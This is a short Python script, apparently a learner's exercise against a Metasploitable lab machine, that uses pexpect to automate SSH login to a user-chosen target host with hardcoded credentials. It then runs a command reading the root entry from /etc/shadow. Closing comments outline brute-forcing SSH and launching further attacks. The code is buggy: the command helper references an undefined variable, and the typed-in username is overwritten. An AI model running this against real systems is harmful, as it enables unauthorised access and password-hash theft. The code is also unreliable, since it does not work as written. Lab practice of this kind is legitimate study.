#!/usr/bin/python

import pexpect

PROMPT = ['# ', '>>> ', '> ', '\$ ']


def send_command(connection,command):
    child.sendline(command)
    child.expect(PROMPT)
    print(child.before)

def connect(user, host, password):
    #When we login via metaspoint it asks us whether we want to remember it
    ssh_newkey = 'Are you sure you want to continue connecting'
    #We want to just say yes
    connStr = 'ssh ' +  user + '@' + host
    child = pexpect.spawn(connStr) # libary
    ret = child.expect([pexpect.TIMEOUT, ssh_newkey, '[P|p]assword: ' ])
    if ret == 0:
        print('[-] Error Connecting')
        return
    if ret == 1:
        child.sendline('yes')
        ret = child.expect([pexpect.TIMEOUT, '[P|p]assword: '])
        if ret == 0:
            print ('[-] Error Conhnecting')
            return
    child.sendline(password)
    child.expect(PROMPT)
    return child

def main():
    #host = '192.168.1.5' #IP ADdress
    host = raw_input("Enter the Host to Target")
    user = raw_input("Enter SSH username: ")
    user = 'msfadmin'
    password = 'msfadmin0' #Password crack should get this
    child = connect(user, host, password ) #Ssh shell
    send_command(child, 'cat /etc/shadow | grep root;ps' ) #Try this command on kali linux



main()



#First we must Automate the sSH login, then we bruteforce into ssh then we can
#Execute commands on the target after bruteforcing ssh
# now we can launch fto attacjs
